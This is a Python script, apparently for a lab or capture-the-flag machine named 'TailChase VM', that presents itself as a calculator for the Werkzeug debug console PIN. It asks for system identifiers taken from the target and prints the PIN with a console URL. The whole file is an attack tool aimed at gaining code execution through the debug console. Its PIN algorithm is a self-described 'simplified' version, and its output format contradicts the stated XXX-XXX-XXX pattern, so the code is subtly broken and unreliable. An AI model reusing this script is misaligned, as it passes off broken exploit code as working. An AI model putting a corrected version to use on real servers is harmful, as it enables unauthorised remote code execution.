#!/usr/bin/env python3
"""
werkzeug_pin_cracker.py - Werkzeug PIN Exploit Calculator
Use this to compute the Werkzeug debug console PIN
"""
import hashlib
from itertools import chain

def get_pin(machine_id, boot_id, mac_address):
    """Compute Werkzeug PIN from system identifiers"""
    mac = mac_address.replace(':', '')

    # This is the simplified algorithm
    h = hashlib.sha1()
    h.update((machine_id + boot_id).encode())
    h.update(mac.encode())

    # Generate the PIN parts
    digest = h.hexdigest()

    # Format: XXX-XXX-XXX
    pin_parts = []
    for i in range(3):
        part = int(digest[i*5:(i+1)*5], 16) % 100000
        pin_parts.append(f"{part:03d}")

    return '-'.join(pin_parts)

def main():
    print("=" * 50)
    print("Werkzeug PIN Calculator for TailChase VM")
    print("=" * 50)
    print()

    machine_id = input("Enter /etc/machine-id: ").strip()
    boot_id = input("Enter /proc/sys/kernel/random/boot_id: ").strip()
    mac = input("Enter MAC address (from /sys/class/net/eth0/address): ").strip()

    pin = get_pin(machine_id, boot_id, mac)

    print()
    print(f"[+] Computed PIN: {pin}")
    print(f"[+] URL: http://TARGET_IP/console?pin={pin}")

if __name__ == '__main__':
    main()
